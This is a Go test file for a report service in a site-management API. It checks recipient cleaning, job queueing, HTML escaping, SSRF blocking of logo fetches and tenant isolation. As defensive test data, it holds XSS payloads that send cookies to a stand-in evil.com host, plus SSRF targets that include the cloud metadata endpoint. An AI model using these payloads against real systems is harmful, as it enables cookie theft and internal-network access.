package report

import (
	"context"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"

	"github.com/mosamlife/wpmgr/apps/api/internal/httpclient"
	"github.com/mosamlife/wpmgr/apps/api/internal/report/render/html"
	"github.com/mosamlife/wpmgr/apps/api/internal/report/render/pdf"
	"github.com/mosamlife/wpmgr/apps/api/internal/report/reportdata"
)

// ---------------------------------------------------------------------------
// Stub repo
// ---------------------------------------------------------------------------

type stubRepo struct {
	getSchedule     func(ctx context.Context, tenantID, clientID uuid.UUID) (Schedule, bool, error)
	upsertSchedule  func(ctx context.Context, in UpsertScheduleInput) (Schedule, error)
	createReport    func(ctx context.Context, in CreateReportInput) (GeneratedReport, error)
	failReport      func(ctx context.Context, tenantID, id uuid.UUID, msg string) (GeneratedReport, error)
	getActiveReport func(ctx context.Context, tenantID, clientID uuid.UUID) (GeneratedReport, bool, error)
	getTenantName   func(ctx context.Context, tenantID uuid.UUID) (string, error)
	getClientInfo   func(ctx context.Context, tenantID, clientID uuid.UUID) (ClientInfo, error)
	// getClientTimezone stands in for the client's timezone; unset is "".
	getClientTimezone func(ctx context.Context, tenantID, clientID uuid.UUID) (string, error)
}

func (r *stubRepo) GetSchedule(ctx context.Context, tenantID, clientID uuid.UUID) (Schedule, bool, error) {
	if r.getSchedule != nil {
		return r.getSchedule(ctx, tenantID, clientID)
	}
	return Schedule{}, false, nil
}
func (r *stubRepo) UpsertSchedule(ctx context.Context, tenantID, clientID uuid.UUID, merge ScheduleMerge) (Schedule, error) {
	// Like the real repo: the stored schedule goes through merge, and what merge
	// returns is what is written (upsertSchedule sees it).
	stored, found, err := r.GetSchedule(ctx, tenantID, clientID)
	if err != nil {
		return Schedule{}, err
	}
	in := merge(stored, found)
	if r.upsertSchedule != nil {
		return r.upsertSchedule(ctx, in)
	}
	return Schedule{TenantID: in.TenantID, ClientID: in.ClientID, Recipients: in.Recipients}, nil
}
func (r *stubRepo) ListDueSchedules(ctx context.Context, limit int32) ([]DueSchedule, error) {
	return nil, nil
}
func (r *stubRepo) ClaimAdvanceSchedule(ctx context.Context, tenantID, scheduleID uuid.UUID, newNextAt time.Time) (Schedule, error) {
	return Schedule{}, nil
}
func (r *stubRepo) CreateReport(ctx context.Context, in CreateReportInput) (GeneratedReport, error) {
	if r.createReport != nil {
		return r.createReport(ctx, in)
	}
	return GeneratedReport{ID: uuid.New(), TenantID: in.TenantID, ClientID: in.ClientID, Status: StatusPending}, nil
}
func (r *stubRepo) CreateReportAgent(ctx context.Context, in CreateReportInput) (GeneratedReport, error) {
	return r.CreateReport(ctx, in)
}
func (r *stubRepo) MarkGenerating(ctx context.Context, tenantID, id uuid.UUID) (GeneratedReport, error) {
	return GeneratedReport{}, nil
}
func (r *stubRepo) CompleteReport(ctx context.Context, tenantID, id uuid.UUID, htmlKey, pdfKey string, snapshot []byte) (GeneratedReport, error) {
	return GeneratedReport{}, nil
}
func (r *stubRepo) FailReport(ctx context.Context, tenantID, id uuid.UUID, errMsg string) (GeneratedReport, error) {
	if r.failReport != nil {
		return r.failReport(ctx, tenantID, id, errMsg)
	}
	return GeneratedReport{ID: id, Status: StatusFailed}, nil
}
func (r *stubRepo) GetReport(ctx context.Context, tenantID, clientID, id uuid.UUID) (GeneratedReport, error) {
	// A report row waiting for its job: what a worker finds on the first attempt.
	return GeneratedReport{ID: id, TenantID: tenantID, ClientID: clientID, Status: StatusPending}, nil
}
func (r *stubRepo) ListReports(ctx context.Context, in ListReportsInput) (ListReportsResult, error) {
	return ListReportsResult{}, nil
}
func (r *stubRepo) DeleteReport(ctx context.Context, tenantID, clientID, id uuid.UUID) error {
	return nil
}
func (r *stubRepo) GetTenantName(ctx context.Context, tenantID uuid.UUID) (string, error) {
	if r.getTenantName != nil {
		return r.getTenantName(ctx, tenantID)
	}
	return "", nil
}
func (r *stubRepo) GetClientInfo(ctx context.Context, tenantID, clientID uuid.UUID) (ClientInfo, error) {
	if r.getClientInfo != nil {
		return r.getClientInfo(ctx, tenantID, clientID)
	}
	return ClientInfo{}, nil
}
func (r *stubRepo) GetClientTimezone(ctx context.Context, tenantID, clientID uuid.UUID) (string, error) {
	if r.getClientTimezone != nil {
		return r.getClientTimezone(ctx, tenantID, clientID)
	}
	return "", nil
}
func (r *stubRepo) GetActiveReport(ctx context.Context, tenantID, clientID uuid.UUID) (GeneratedReport, bool, error) {
	if r.getActiveReport != nil {
		return r.getActiveReport(ctx, tenantID, clientID)
	}
	return GeneratedReport{}, false, nil
}

// ---------------------------------------------------------------------------
// Fake enqueuer
// ---------------------------------------------------------------------------

type fakeEnqueuer struct {
	calls []GenerateArgs
	err   error

	// active names the reports that still have a queued or running job; any
	// other report has none. activeErr fails the lookup. asked records every
	// report the lookup was made for.
	active    map[uuid.UUID]bool
	activeErr error
	asked     []activeJobQuery
}

// activeJobQuery is one HasActiveGenerateJob call.
type activeJobQuery struct{ tenantID, reportID uuid.UUID }

func (f *fakeEnqueuer) EnqueueGenerate(_ context.Context, args GenerateArgs) error {
	if f.err != nil {
		return f.err
	}
	f.calls = append(f.calls, args)
	return nil
}

func (f *fakeEnqueuer) HasActiveGenerateJob(_ context.Context, tenantID, reportID uuid.UUID) (bool, error) {
	f.asked = append(f.asked, activeJobQuery{tenantID: tenantID, reportID: reportID})
	if f.activeErr != nil {
		return false, f.activeErr
	}
	return f.active[reportID], nil
}

// ---------------------------------------------------------------------------
// FIX-3: validateScheduleInput returns cleaned recipients
// ---------------------------------------------------------------------------

// TestValidateScheduleInputReturnsCleaned verifies that validateScheduleInput
// returns a cleaned (deduped, bare-address) slice, and that UpsertSchedule
// persists the cleaned slice — not the original raw input.
func TestValidateScheduleInputReturnsCleaned(t *testing.T) {
	tenantID := uuid.New()
	clientID := uuid.New()

	var persisted []string
	repo := &stubRepo{
		upsertSchedule: func(_ context.Context, in UpsertScheduleInput) (Schedule, error) {
			persisted = in.Recipients
			return Schedule{TenantID: in.TenantID, ClientID: in.ClientID, Recipients: in.Recipients}, nil
		},
	}
	svc := NewService(repo, nil /*blob*/)
	// blob=nil triggers 503 only on GenerateNow, not UpsertSchedule.

	rawRecipients := []string{
		"Alice <alice@example.com>", // display-name form → bare alice@example.com
		"BOB@example.com",           // uppercase → normalised bob@example.com
		"alice@example.com",         // duplicate of Alice → deduplicated
		"carol@example.com",
	}
	_, err := svc.UpsertSchedule(context.Background(), UpsertScheduleInput{
		TenantID:   tenantID,
		ClientID:   clientID,
		Cadence:    "weekly",
		SendDay:    1,
		SendHour:   8,
		Recipients: rawRecipients,
	})
	if err != nil {
		t.Fatalf("UpsertSchedule failed: %v", err)
	}
	// Expect exactly 3 bare addresses, alice de-duplicated, case-folded.
	if len(persisted) != 3 {
		t.Fatalf("expected 3 cleaned recipients, got %d: %v", len(persisted), persisted)
	}
	seen := make(map[string]bool)
	for _, r := range persisted {
		if seen[r] {
			t.Fatalf("duplicate recipient in persisted list: %s", r)
		}
		seen[r] = true
		// All addresses must be bare (no display-name angle-bracket form).
		if strings.Contains(r, "<") || strings.Contains(r, ">") {
			t.Fatalf("persisted recipient has display-name form: %s", r)
		}
	}
	if !seen["alice@example.com"] {
		t.Fatalf("expected alice@example.com in persisted list, got %v", persisted)
	}
	if !seen["bob@example.com"] {
		t.Fatalf("expected bob@example.com (case-folded) in persisted list, got %v", persisted)
	}
}

// ---------------------------------------------------------------------------
// FIX-4: GenerateNow enqueues a River job
// ---------------------------------------------------------------------------

// TestGenerateNowEnqueuesJob verifies that GenerateNow inserts a GenerateArgs
// River job when the enqueuer is wired.
func TestGenerateNowEnqueuesJob(t *testing.T) {
	tenantID := uuid.New()
	clientID := uuid.New()
	repo := &stubRepo{}
	blob := &noopBlobStorer{}
	svc := NewService(repo, blob)
	enq := &fakeEnqueuer{}
	svc.SetEnqueuer(enq)

	rpt, err := svc.GenerateNow(context.Background(), tenantID, clientID, GenerateNowInput{
		PeriodStart: time.Now().UTC().AddDate(0, 0, -7),
		PeriodEnd:   time.Now().UTC(),
	})
	if err != nil {
		t.Fatalf("GenerateNow failed: %v", err)
	}
	if rpt.Status != StatusPending {
		t.Fatalf("expected status pending, got %s", rpt.Status)
	}
	if len(enq.calls) != 1 {
		t.Fatalf("expected 1 enqueued job, got %d", len(enq.calls))
	}
	if enq.calls[0].ReportID != rpt.ID {
		t.Fatalf("enqueued job report_id %s != created report id %s", enq.calls[0].ReportID, rpt.ID)
	}
	if enq.calls[0].TenantID != tenantID {
		t.Fatalf("enqueued job tenant_id mismatch")
	}
}

// TestGenerateNowDeduplicateGuard verifies that a second call to GenerateNow
// for the same client while a report is already pending returns the existing
// report without creating a duplicate row or enqueuing a second job.
func TestGenerateNowDeduplicateGuard(t *testing.T) {
	tenantID := uuid.New()
	clientID := uuid.New()
	existingID := uuid.New()

	createCalls := 0
	repo := &stubRepo{
		getActiveReport: func(_ context.Context, _, _ uuid.UUID) (GeneratedReport, bool, error) {
			return GeneratedReport{ID: existingID, Status: StatusPending}, true, nil
		},
		createReport: func(_ context.Context, in CreateReportInput) (GeneratedReport, error) {
			createCalls++
			return GeneratedReport{ID: uuid.New(), TenantID: in.TenantID, ClientID: in.ClientID, Status: StatusPending}, nil
		},
	}
	blob := &noopBlobStorer{}
	svc := NewService(repo, blob)
	enq := &fakeEnqueuer{}
	svc.SetEnqueuer(enq)

	rpt, err := svc.GenerateNow(context.Background(), tenantID, clientID, GenerateNowInput{
		PeriodStart: time.Now().UTC().AddDate(0, 0, -7),
		PeriodEnd:   time.Now().UTC(),
	})
	if err != nil {
		t.Fatalf("GenerateNow failed: %v", err)
	}
	if rpt.ID != existingID {
		t.Fatalf("expected existing report ID %s, got %s", existingID, rpt.ID)
	}
	if createCalls != 0 {
		t.Fatalf("expected no new report row created, got %d create calls", createCalls)
	}
	if len(enq.calls) != 0 {
		t.Fatalf("expected no new jobs enqueued, got %d", len(enq.calls))
	}
}

// TestGenerateNowEnqueueFailureMarksRowFailed verifies that when enqueue fails
// after row creation, the report row is marked failed and an error is returned.
func TestGenerateNowEnqueueFailureMarksRowFailed(t *testing.T) {
	tenantID := uuid.New()
	clientID := uuid.New()

	failedIDs := make([]uuid.UUID, 0)
	repo := &stubRepo{
		failReport: func(_ context.Context, _ uuid.UUID, id uuid.UUID, _ string) (GeneratedReport, error) {
			failedIDs = append(failedIDs, id)
			return GeneratedReport{ID: id, Status: StatusFailed}, nil
		},
	}
	blob := &noopBlobStorer{}
	svc := NewService(repo, blob)
	enq := &fakeEnqueuer{err: errors.New("river unavailable")}
	svc.SetEnqueuer(enq)

	_, err := svc.GenerateNow(context.Background(), tenantID, clientID, GenerateNowInput{
		PeriodStart: time.Now().UTC().AddDate(0, 0, -7),
		PeriodEnd:   time.Now().UTC(),
	})
	if err == nil {
		t.Fatal("expected error when enqueue fails, got nil")
	}
	if len(failedIDs) != 1 {
		t.Fatalf("expected 1 FailReport call, got %d", len(failedIDs))
	}
}

// ---------------------------------------------------------------------------
// FIX-2: scheduler period clamp
// ---------------------------------------------------------------------------

// TestSchedulerPeriodClamp verifies that the ScheduleScanWorker clamps a
// stale last_run_at to maxPeriodDays so the period never exceeds the cap.
func TestSchedulerPeriodClamp(t *testing.T) {
	now := time.Now().UTC()
	// last_run_at from 3 years ago — would produce a ~1095-day window.
	staleLastRun := now.AddDate(-3, 0, 0)

	// Simulate the scheduler period computation (mirrors worker.go logic).
	periodStart := staleLastRun
	periodEnd := now
	if periodEnd.Sub(periodStart) > time.Duration(maxPeriodDays)*24*time.Hour {
		periodStart = periodEnd.Add(-time.Duration(maxPeriodDays) * 24 * time.Hour)
	}

	got := int(periodEnd.Sub(periodStart).Hours() / 24)
	if got > maxPeriodDays {
		t.Fatalf("period after clamp = %d days, expected <= %d", got, maxPeriodDays)
	}
	if got < maxPeriodDays-1 {
		// Should be very close to maxPeriodDays (within 1 day rounding).
		t.Fatalf("period after clamp = %d days, expected ~%d", got, maxPeriodDays)
	}
}

// TestSchedulerPeriodNormalNotClamped verifies that a normal last_run_at
// (7 days ago) is NOT clamped and passes through unchanged.
func TestSchedulerPeriodNormalNotClamped(t *testing.T) {
	now := time.Now().UTC()
	lastRun := now.AddDate(0, 0, -7)

	periodStart := lastRun
	periodEnd := now
	if periodEnd.Sub(periodStart) > time.Duration(maxPeriodDays)*24*time.Hour {
		periodStart = periodEnd.Add(-time.Duration(maxPeriodDays) * 24 * time.Hour)
	}

	got := int(periodEnd.Sub(periodStart).Hours() / 24)
	if got != 7 {
		t.Fatalf("period should be 7 days, got %d", got)
	}
}

// ---------------------------------------------------------------------------
// FIX-1 / FIX-5: HTML template escaping + no remote resources
// ---------------------------------------------------------------------------

// TestHTMLRendererEscapesHostileInput verifies that hostile client names and
// intro_text (script tags, quotes) are HTML-escaped in the output, and that
// the rendered HTML contains no remote src= attributes.
func TestHTMLRendererEscapesHostileInput(t *testing.T) {
	r, err := html.NewRenderer()
	if err != nil {
		t.Fatalf("NewRenderer: %v", err)
	}

	hostile := reportdata.ReportData{
		SchemaVersion: 1,
		GeneratedAt:   time.Now(),
		PeriodStart:   time.Now().AddDate(0, 0, -7),
		PeriodEnd:     time.Now(),
		PeriodLabel:   "1 Jun 2026 – 7 Jun 2026",
		ClientName:    `<script>alert('xss')</script>`,
		AgencyName:    `Agency & "Partners"`,
		IntroText:     `<img src="http://evil.com/steal?c=` + "`" + `document.cookie` + "`" + `">`,
		ClosingText:   `</div><script>fetch('http://evil.com')</script>`,
		ShowPoweredBy: true,
		Sections:      reportdata.DefaultSectionFlags(),
		Sites:         []reportdata.SiteReport{},
	}

	// logoBytes=nil → should render without any <img> element.
	out, err := r.Render(hostile, nil)
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	body := string(out)

	// html/template must escape the script tags.
	if strings.Contains(body, "<script>") {
		t.Errorf("rendered HTML contains unescaped <script> tag")
	}
	// Must not contain any src="http (remote image URL).
	if strings.Contains(body, `src="http`) {
		t.Errorf("rendered HTML contains remote src= URL: possible XSS / resource leak")
	}
	// With nil logoBytes, no <img should appear at all for the logo.
	// (Other images could be in intro_text — but they'd be escaped.)
	// The report header logo block should be absent.
	if strings.Contains(body, `class="logo"`) {
		t.Errorf("rendered HTML contains logo element but logoBytes were nil")
	}
}

// TestHTMLRendererLogoDataURI verifies that when valid logo bytes are provided
// the renderer emits a data: URI and no remote src= URL.
func TestHTMLRendererLogoDataURI(t *testing.T) {
	r, err := html.NewRenderer()
	if err != nil {
		t.Fatalf("NewRenderer: %v", err)
	}

	data := reportdata.ReportData{
		SchemaVersion: 1,
		GeneratedAt:   time.Now(),
		PeriodStart:   time.Now().AddDate(0, 0, -7),
		PeriodEnd:     time.Now(),
		PeriodLabel:   "1 Jun – 7 Jun 2026",
		ClientName:    "Acme Corp",
		AgencyName:    "Agency",
		Sections:      reportdata.DefaultSectionFlags(),
		Sites:         []reportdata.SiteReport{},
		// LogoURL would normally be set before the worker calls Render, but the
		// renderer must clear it and use data URI regardless.
		LogoURL: "https://example.com/logo.png",
	}

	// Minimal valid 1x1 PNG (89 bytes).
	pngBytes := minimalPNG()
	out, err := r.Render(data, pngBytes)
	if err != nil {
		t.Fatalf("Render with logo: %v", err)
	}
	body := string(out)

	// Must contain a data: URI, not a remote URL.
	if !strings.Contains(body, "data:image/png;base64,") {
		t.Errorf("expected data URI for logo, got none")
	}
	if strings.Contains(body, `src="https://example.com`) {
		t.Errorf("rendered HTML contains remote logo URL — LogoURL not replaced")
	}
}

// ---------------------------------------------------------------------------
// FIX-1 / FIX-5: SSRF logo fetch
// ---------------------------------------------------------------------------

// TestFetchAndValidateLogoRejectsPrivateHosts verifies that FetchAndValidateLogo
// blocks private/loopback/link-local targets via the SSRF guard and returns
// nil bytes rather than failing the whole report path.
func TestFetchAndValidateLogoRejectsPrivateHosts(t *testing.T) {
	// Production SSRF client (guard on).
	client := httpclient.New(httpclient.DefaultConfig())
	ctx := context.Background()

	privateTargets := []string{
		"http://127.0.0.1/logo.png",
		"http://169.254.169.254/logo.png",
		"http://10.0.0.1/logo.png",
		"http://192.168.1.1/logo.png",
		"http://localhost/logo.png",
	}
	for _, target := range privateTargets {
		t.Run(target, func(t *testing.T) {
			got, err := pdf.FetchAndValidateLogo(ctx, client, target)
			// Must return nil bytes and an error — never succeed.
			if err == nil {
				t.Fatalf("expected error for SSRF target %s, got nil", target)
			}
			if got != nil {
				t.Fatalf("expected nil bytes for blocked target %s, got %d bytes", target, len(got))
			}
		})
	}
}

// TestFetchAndValidateLogoEmptyURL verifies that an empty URL returns nil, nil.
func TestFetchAndValidateLogoEmptyURL(t *testing.T) {
	client := httpclient.New(httpclient.DefaultConfig())
	got, err := pdf.FetchAndValidateLogo(context.Background(), client, "")
	if err != nil {
		t.Fatalf("expected nil error for empty URL, got: %v", err)
	}
	if got != nil {
		t.Fatalf("expected nil bytes for empty URL, got %d bytes", len(got))
	}
}

// TestFetchAndValidateLogoRejectsRedirectToMetadata verifies that a server
// that redirects to the metadata endpoint is also blocked (the SSRF guard
// applies on each dial, including redirects through the standard http.Client
// redirect chain).
func TestFetchAndValidateLogoRejectsRedirectToMetadata(t *testing.T) {
	// Start a test server that redirects to the metadata IP.
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "http://169.254.169.254/latest/meta-data/", http.StatusFound)
	}))
	defer srv.Close()

	// Use the escape-hatch client that can reach the loopback test server,
	// but the SSRF guard still applies to the redirect target.
	client := httpclient.New(httpclient.Config{
		AllowPrivateNetworks: true,
		Timeout:              5 * time.Second,
	})
	ctx := context.Background()

	got, err := pdf.FetchAndValidateLogo(ctx, client, srv.URL+"/logo.png")
	// The redirect to 169.254.x must be blocked.
	if err == nil {
		t.Fatal("expected error for redirect-to-metadata, got nil")
	}
	if got != nil {
		t.Fatalf("expected nil bytes for blocked redirect, got %d bytes", len(got))
	}
}

// TestFetchAndValidateLogoReturnsNilOnFetchError verifies that any fetch error
// returns nil bytes without panicking — the report itself must still generate.
func TestFetchAndValidateLogoReturnsNilOnFetchError(t *testing.T) {
	client := httpclient.New(httpclient.DefaultConfig())
	// Non-routable address — will time out or be rejected by SSRF guard.
	got, err := pdf.FetchAndValidateLogo(context.Background(), client, "https://192.0.2.1/logo.png")
	if err == nil {
		t.Log("unexpected success (skipping; dial may succeed in some test environments)")
		return
	}
	if got != nil {
		t.Fatalf("expected nil bytes on fetch error, got %d bytes", len(got))
	}
}

// ---------------------------------------------------------------------------
// FIX-5: PDF smoke test
// ---------------------------------------------------------------------------

// TestPDFSmokeRenderProducesPDF verifies that a fixture ReportData renders to
// a non-trivially-sized PDF starting with the %PDF magic bytes.
func TestPDFSmokeRenderProducesPDF(t *testing.T) {
	r := pdf.NewFpdfRenderer()

	data := reportdata.ReportData{
		SchemaVersion: 1,
		GeneratedAt:   time.Date(2026, 6, 1, 0, 0, 0, 0, time.UTC),
		PeriodStart:   time.Date(2026, 5, 1, 0, 0, 0, 0, time.UTC),
		PeriodEnd:     time.Date(2026, 5, 31, 0, 0, 0, 0, time.UTC),
		PeriodLabel:   "1 May 2026 – 31 May 2026",
		ClientName:    "Fixture Client",
		AgencyName:    "Test Agency",
		ShowPoweredBy: true,
		AccentColor:   "#3b82f6",
		Sections:      reportdata.DefaultSectionFlags(),
		Totals: reportdata.ReportTotals{
			SiteCount:    2,
			AvgUptimePct: 99.5,
			BackupsCount: 8,
		},
		Sites: []reportdata.SiteReport{
			{
				SiteID: uuid.New(),
				Name:   "Site A",
				URL:    "https://site-a.example.com",
			},
		},
	}

	out, err := r.Render(data, nil)
	if err != nil {
		t.Fatalf("PDF Render failed: %v", err)
	}
	if len(out) < 500 {
		t.Fatalf("PDF output suspiciously small: %d bytes", len(out))
	}
	if len(out) < 4 || string(out[:4]) != "%PDF" {
		t.Fatalf("PDF output does not start with %%PDF magic, got: %q", string(out[:min4(len(out))]))
	}
}

func min4(n int) int {
	if n < 4 {
		return n
	}
	return 4
}

// ---------------------------------------------------------------------------
// FIX-5: RLS isolation entries for report tables
// ---------------------------------------------------------------------------
// These tests verify the service-layer tenant isolation (Go middleware layer),
// mirroring the authz/rls_isolation_test.go pattern. They confirm that repo
// methods carry explicit tenant_id in their inputs so cross-tenant access is
// impossible even without Postgres RLS.

// TestReportRepoIsolation_ScheduleCarriesTenantID verifies that UpsertSchedule
// persists the tenantID from the input (not a default/zero value).
func TestReportRepoIsolation_ScheduleCarriesTenantID(t *testing.T) {
	tenantA := uuid.New()
	tenantB := uuid.New()
	clientID := uuid.New()

	var upsertedTenant uuid.UUID
	repo := &stubRepo{
		upsertSchedule: func(_ context.Context, in UpsertScheduleInput) (Schedule, error) {
			upsertedTenant = in.TenantID
			return Schedule{TenantID: in.TenantID}, nil
		},
	}
	svc := NewService(repo, nil)

	_, _ = svc.UpsertSchedule(context.Background(), UpsertScheduleInput{
		TenantID: tenantA,
		ClientID: clientID,
		Cadence:  "weekly",
		SendDay:  1,
		SendHour: 8,
	})
	if upsertedTenant != tenantA {
		t.Fatalf("expected tenantA in upsert, got %s", upsertedTenant)
	}

	// A schedule belonging to tenantB must not be reachable via tenantA's call
	// — the service passes the caller's tenantID, not the schedule's stored tenantID.
	_, _ = svc.UpsertSchedule(context.Background(), UpsertScheduleInput{
		TenantID: tenantB,
		ClientID: clientID,
		Cadence:  "weekly",
		SendDay:  2,
		SendHour: 9,
	})
	if upsertedTenant != tenantB {
		t.Fatalf("second upsert should carry tenantB, got %s", upsertedTenant)
	}
}

// TestReportRepoIsolation_GeneratedReportCarriesTenantID verifies that
// CreateReport and GetReport operations use the caller's tenantID.
func TestReportRepoIsolation_GeneratedReportCarriesTenantID(t *testing.T) {
	tenantA := uuid.New()

	var createdTenant uuid.UUID
	repo := &stubRepo{
		createReport: func(_ context.Context, in CreateReportInput) (GeneratedReport, error) {
			createdTenant = in.TenantID
			return GeneratedReport{ID: uuid.New(), TenantID: in.TenantID, Status: StatusPending}, nil
		},
	}
	blob := &noopBlobStorer{}
	svc := NewService(repo, blob)
	svc.SetEnqueuer(&fakeEnqueuer{})

	_, _ = svc.GenerateNow(context.Background(), tenantA, uuid.New(), GenerateNowInput{
		PeriodStart: time.Now().UTC().AddDate(0, 0, -7),
		PeriodEnd:   time.Now().UTC(),
	})
	if createdTenant != tenantA {
		t.Fatalf("expected tenantA in create, got %s", createdTenant)
	}
}

// TestPresignReportURLs_OnlyCompletedReportsGetURLs verifies the shared
// presign helper used by both the list and detail endpoints: completed
// reports with blob keys get URLs, everything else gets empty strings.
func TestPresignReportURLs_OnlyCompletedReportsGetURLs(t *testing.T) {
	svc := NewService(&stubRepo{}, &urlBlobStorer{})

	completed := GeneratedReport{
		Status:      StatusCompleted,
		HTMLBlobKey: "reports/t/c/r.html",
		PDFBlobKey:  "reports/t/c/r.pdf",
	}
	htmlURL, pdfURL := svc.PresignReportURLs(context.Background(), completed)
	if htmlURL != "https://signed.example/reports/t/c/r.html" {
		t.Fatalf("completed report html url = %q", htmlURL)
	}
	if pdfURL != "https://signed.example/reports/t/c/r.pdf" {
		t.Fatalf("completed report pdf url = %q", pdfURL)
	}

	pending := GeneratedReport{Status: StatusPending, HTMLBlobKey: "k.html", PDFBlobKey: "k.pdf"}
	htmlURL, pdfURL = svc.PresignReportURLs(context.Background(), pending)
	if htmlURL != "" || pdfURL != "" {
		t.Fatalf("non-completed report must not get urls, got %q / %q", htmlURL, pdfURL)
	}

	// nil blob store (object storage not configured) degrades to empty URLs.
	noBlob := NewService(&stubRepo{}, nil)
	htmlURL, pdfURL = noBlob.PresignReportURLs(context.Background(), completed)
	if htmlURL != "" || pdfURL != "" {
		t.Fatalf("nil blob store must yield empty urls, got %q / %q", htmlURL, pdfURL)
	}
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// urlBlobStorer returns a deterministic presigned URL for any key.
type urlBlobStorer struct{ noopBlobStorer }

func (u *urlBlobStorer) PresignGet(_ context.Context, key string, _ time.Duration) (string, error) {
	return "https://signed.example/" + key, nil
}

// noopBlobStorer satisfies BlobStorer without doing anything.
type noopBlobStorer struct{}

func (n *noopBlobStorer) Put(_ context.Context, _ string, _ io.Reader, _ int64) error {
	return nil
}
func (n *noopBlobStorer) Delete(_ context.Context, _ string) error { return nil }
func (n *noopBlobStorer) PresignGet(_ context.Context, _ string, _ time.Duration) (string, error) {
	return "", nil
}

// minimalPNG returns a minimal valid 1x1 transparent PNG.
// This is the smallest valid PNG that image.DecodeConfig can decode.
func minimalPNG() []byte {
	// A 1x1 black PNG (68 bytes), hand-crafted.
	return []byte{
		0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, // PNG signature
		0x00, 0x00, 0x00, 0x0d, // IHDR length
		0x49, 0x48, 0x44, 0x52, // IHDR
		0x00, 0x00, 0x00, 0x01, // width=1
		0x00, 0x00, 0x00, 0x01, // height=1
		0x08, 0x02, // 8-bit RGB
		0x00, 0x00, 0x00, // compression/filter/interlace
		0x90, 0x77, 0x53, 0xde, // CRC
		0x00, 0x00, 0x00, 0x0c, // IDAT length
		0x49, 0x44, 0x41, 0x54, // IDAT
		0x08, 0xd7, 0x63, 0xf8, 0xcf, 0xc0, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01, // compressed
		0xe2, 0x21, 0xbc, 0x33, // CRC
		0x00, 0x00, 0x00, 0x00, // IEND length
		0x49, 0x45, 0x4e, 0x44, // IEND
		0xae, 0x42, 0x60, 0x82, // CRC
	}
}
